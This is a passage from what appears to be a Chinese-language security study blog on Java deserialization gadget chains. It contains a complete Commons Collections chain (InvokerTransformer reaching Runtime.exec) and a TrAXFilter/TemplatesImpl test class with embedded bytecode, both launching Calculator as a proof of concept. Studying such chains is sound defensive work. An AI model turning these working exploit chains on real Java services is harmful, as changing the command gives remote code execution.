args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;), <span class="comment">//null相当于空数组</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;), <span class="comment">//null相当于空数组</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fake);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;tt&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tt, <span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line">        outerMap.clear();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h3><p>TrAXFilter会执行传入的templates的newTransformer方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">        <span class="type">TransformerConfigurationException</span></span><br><span class="line"><span class="variable">_transformer</span> <span class="operator">=</span> (TransformerImpl) templates.newTransformer();</span><br></pre></td></tr></table></figure>

<p>测试代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.Reflections.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/25 19:03</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_TrAXFilter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">54</span> ,-<span class="number">2</span> ,-<span class="number">70</span> ,-<span class="number">66</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">52</span> ,<span class="number">0</span> ,<span class="number">47</span> ,<span class="number">10</span> ,<span class="number">0</span> ,<span class="number">9</span> ,<span class="number">0</span> ,<span class="number">22</span> ,</span><br><span class="line">            <span class="number">10</span> ,<span class="number">0</span> ,<span class="number">23</span> ,<span class="number">0</span> ,<span class="number">24</span> ,<span class="number">8</span> ,<span class="number">0</span> ,<span class="number">25</span> ,<span class="number">10</span> ,<span class="number">0</span> ,<span class="number">23</span> ,<span class="number">0</span> ,<span class="number">26</span> ,<span class="number">9</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">27</span> ,<span class="number">0</span> ,<span class="number">28</span> ,<span class="number">8</span> ,<span class="number">0</span> ,<span class="number">29</span> ,<span class="number">10</span> ,<span class="number">0</span> ,<span class="number">30</span> ,<span class="number">0</span> ,<span class="number">31</span> ,<span class="number">7</span> ,<span class="number">0</span> ,<span class="number">32</span> ,<span class="number">7</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">33</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">9</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">115</span> ,<span class="number">102</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">109</span> ,<span class="number">1</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">114</span> ,<span class="number">40</span> ,<span class="number">76</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">103</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">105</span> ,</span><br><span class="line">            <span class="number">110</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">116</span> ,<span class="number">99</span> ,<span class="number">47</span> ,<span class="number">68</span> ,</span><br><span class="line">            <span class="number">79</span> ,<span class="number">77</span> ,<span class="number">59</span> ,<span class="number">91</span> ,<span class="number">76</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,</span><br><span class="line">            <span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">109</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,</span><br><span class="line">            <span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">105</span> ,<span class="number">122</span> ,</span><br><span class="line">            <span class="number">101</span> ,<span class="number">114</span> ,<span class="number">47</span> ,<span class="number">83</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">105</span> ,<span class="number">122</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">111</span> ,</span><br><span class="line">            <span class="number">110</span> ,<span class="number">72</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">100</span> ,<span class="number">108</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">59</span> ,<span class="number">41</span> ,<span class="number">86</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">67</span> ,</span><br><span class="line">            <span class="number">111</span> ,<span class="number">100</span> ,<span class="number">101</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">15</span> ,<span class="number">76</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">101</span> ,<span class="number">78</span> ,<span class="number">117</span> ,<span class="number">109</span> ,<span class="number">98</span> ,<span class="number">101</span> ,</span><br><span class="line">            <span class="number">114</span> ,<span class="number">84</span> ,<span class="number">97</span> ,<span class="number">98</span> ,<span class="number">108</span> ,<span class="number">101</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">10</span> ,<span class="number">69</span> ,<span class="number">120</span> ,<span class="number">99</span> ,<span class="number">101</span> ,<span class="number">112</span> ,<span class="number">116</span> ,</span><br><span class="line">            <span class="number">105</span> ,<span class="number">111</span> ,<span class="number">110</span> ,<span class="number">115</span> ,<span class="number">7</span> ,<span class="number">0</span> ,<span class="number">34</span> ,<span class="number">1</span> ,<span class="number">0</span> ,-<span class="number">90</span> ,<span class="number">40</span> ,<span class="number">76</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">120</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">120</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">116</span> ,<span class="number">99</span> ,<span class="number">47</span> ,<span class="number">68</span> ,<span class="number">79</span> ,<span class="number">77</span> ,<span class="number">59</span> ,<span class="number">76</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">120</span> ,<span class="number">109</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">100</span> ,</span><br><span class="line">            <span class="number">116</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">68</span> ,<span class="number">84</span> ,<span class="number">77</span> ,<span class="number">65</span> ,<span class="number">120</span> ,<span class="number">105</span> ,<span class="number">115</span> ,<span class="number">73</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">116</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">59</span> ,<span class="number">76</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,</span><br><span class="line">            <span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">109</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,</span><br><span class="line">            <span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">105</span> ,<span class="number">122</span> ,</span><br><span class="line">            <span class="number">101</span> ,<span class="number">114</span> ,<span class="number">47</span> ,<span class="number">83</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">105</span> ,<span class="number">122</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">111</span> ,</span><br><span class="line">            <span class="number">110</span> ,<span class="number">72</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">100</span> ,<span class="number">108</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">59</span> ,<span class="number">41</span> ,<span class="number">86</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">6</span> ,<span class="number">60</span> ,</span><br><span class="line">            <span class="number">105</span> ,<span class="number">110</span> ,<span class="number">105</span> ,<span class="number">116</span> ,<span class="number">62</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">3</span> ,<span class="number">40</span> ,<span class="number">41</span> ,<span class="number">86</span> ,<span class="number">7</span> ,<span class="number">0</span> ,<span class="number">35</span> ,<span class="number">1</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">10</span> ,<span class="number">83</span> ,<span class="number">111</span> ,<span class="number">117</span> ,<span class="number">114</span> ,<span class="number">99</span> ,<span class="number">101</span> ,<span class="number">70</span> ,<span class="number">105</span> ,<span class="number">108</span> ,<span class="number">101</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">23</span> ,</span><br><span class="line">            <span class="number">72</span> ,<span class="number">101</span> ,<span class="number">108</span> ,<span class="number">108</span> ,<span class="number">111</span> ,<span class="number">84</span> ,<span class="number">101</span> ,<span class="number">109</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">115</span> ,<span class="number">73</span> ,</span><br><span class="line">            <span class="number">109</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">46</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">17</span> ,<span class="number">0</span> ,<span class="number">18</span> ,<span class="number">7</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">36</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">37</span> ,<span class="number">0</span> ,<span class="number">38</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">40</span> ,<span class="number">111</span> ,<span class="number">112</span> ,<span class="number">101</span> ,<span class="number">110</span> ,<span class="number">32</span> ,<span class="number">47</span> ,</span><br><span class="line">            <span class="number">83</span> ,<span class="number">121</span> ,<span class="number">115</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">65</span> ,<span class="number">112</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">105</span> ,<span class="number">99</span> ,<span class="number">97</span> ,<span class="number">116</span> ,</span><br><span class="line">            <span class="number">105</span> ,<span class="number">111</span> ,<span class="number">110</span> ,<span class="number">115</span> ,<span class="number">47</span> ,<span class="number">67</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">99</span> ,<span class="number">117</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">111</span> ,<span class="number">114</span> ,</span><br><span class="line">            <span class="number">46</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">112</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">39</span> ,<span class="number">0</span> ,<span class="number">40</span> ,<span class="number">7</span> ,<span class="number">0</span> ,<span class="number">41</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">42</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">43</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">19</span> ,<span class="number">72</span> ,<span class="number">101</span> ,<span class="number">108</span> ,<span class="number">108</span> ,<span class="number">111</span> ,<span class="number">32</span> ,<span class="number">84</span> ,<span class="number">101</span> ,<span class="number">109</span> ,<span class="number">112</span> ,</span><br><span class="line">            <span class="number">108</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">115</span> ,<span class="number">73</span> ,<span class="number">109</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">7</span> ,<span class="number">0</span> ,<span class="number">44</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">45</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">46</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">28</span> ,<span class="number">121</span> ,<span class="number">115</span> ,<span class="number">111</span> ,<span class="number">115</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,</span><br><span class="line">            <span class="number">72</span> ,<span class="number">101</span> ,<span class="number">108</span> ,<span class="number">108</span> ,<span class="number">111</span> ,<span class="number">84</span> ,<span class="number">101</span> ,<span class="number">109</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">115</span> ,<span class="number">73</span> ,</span><br><span class="line">            <span class="number">109</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">64</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,</span><br><span class="line">            <span class="number">114</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">116</span> ,<span class="number">99</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">114</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">109</span> ,<span class="number">101</span> ,<span class="number">47</span> ,<span class="number">65</span> ,<span class="number">98</span> ,<span class="number">115</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">99</span> ,<span class="number">116</span> ,<span class="number">84</span> ,<span class="number">114</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">101</span> ,<span class="number">116</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">57</span> ,<span class="number">99</span> ,<span class="number">111</span> ,</span><br><span class="line">            <span class="number">109</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,</span><br><span class="line">            <span class="number">101</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">108</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">116</span> ,<span class="number">99</span> ,<span class="number">47</span> ,<span class="number">84</span> ,<span class="number">114</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">101</span> ,</span><br><span class="line">            <span class="number">116</span> ,<span class="number">69</span> ,<span class="number">120</span> ,<span class="number">99</span> ,<span class="number">101</span> ,<span class="number">112</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">111</span> ,<span class="number">110</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">19</span> ,<span class="number">106</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">69</span> ,<span class="number">120</span> ,<span class="number">99</span> ,<span class="number">101</span> ,<span class="number">112</span> ,<span class="number">116</span> ,<span class="number">105</span> ,</span><br><span class="line">            <span class="number">111</span> ,<span class="number">110</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">17</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,</span><br><span class="line">            <span class="number">82</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">109</span> ,<span class="number">101</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">10</span> ,<span class="number">103</span> ,<span class="number">101</span> ,<span class="number">116</span> ,<span class="number">82</span> ,<span class="number">117</span> ,</span><br><span class="line">            <span class="number">110</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">109</span> ,<span class="number">101</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">21</span> ,<span class="number">40</span> ,<span class="number">41</span> ,<span class="number">76</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">82</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">109</span> ,<span class="number">101</span> ,<span class="number">59</span> ,<span class="number">1</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">4</span> ,<span class="number">101</span> ,<span class="number">120</span> ,<span class="number">101</span> ,<span class="number">99</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">39</span> ,<span class="number">40</span> ,<span class="number">76</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">83</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">59</span> ,<span class="number">41</span> ,<span class="number">76</span> ,</span><br><span class="line">            <span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">80</span> ,<span class="number">114</span> ,<span class="number">111</span> ,<span class="number">99</span> ,<span class="number">101</span> ,</span><br><span class="line">            <span class="number">115</span> ,<span class="number">115</span> ,<span class="number">59</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">16</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">83</span> ,<span class="number">121</span> ,<span class="number">115</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">109</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">3</span> ,<span class="number">111</span> ,<span class="number">117</span> ,<span class="number">116</span> ,<span class="number">1</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">21</span> ,<span class="number">76</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">111</span> ,<span class="number">47</span> ,<span class="number">80</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,</span><br><span class="line">            <span class="number">83</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">101</span> ,<span class="number">97</span> ,<span class="number">109</span> ,<span class="number">59</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">19</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,</span><br><span class="line">            <span class="number">105</span> ,<span class="number">111</span> ,<span class="number">47</span> ,<span class="number">80</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">83</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">101</span> ,<span class="number">97</span> ,<span class="number">109</span> ,<span class="number">1</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">7</span> ,<span class="number">112</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">108</span> ,<span class="number">110</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">21</span> ,<span class="number">40</span> ,<span class="number">76</span> ,<span class="number">106</span> ,</span><br><span class="line">            <span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">83</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">103</span> ,</span><br><span class="line">            <span class="number">59</span> ,<span class="number">41</span> ,<span class="number">86</span> ,<span class="number">0</span> ,<span class="number">33</span> ,<span class="number">0</span> ,<span class="number">8</span> ,<span class="number">0</span> ,<span class="number">9</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">3</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">10</span> ,<span class="number">0</span> ,<span class="number">11</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">0</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span 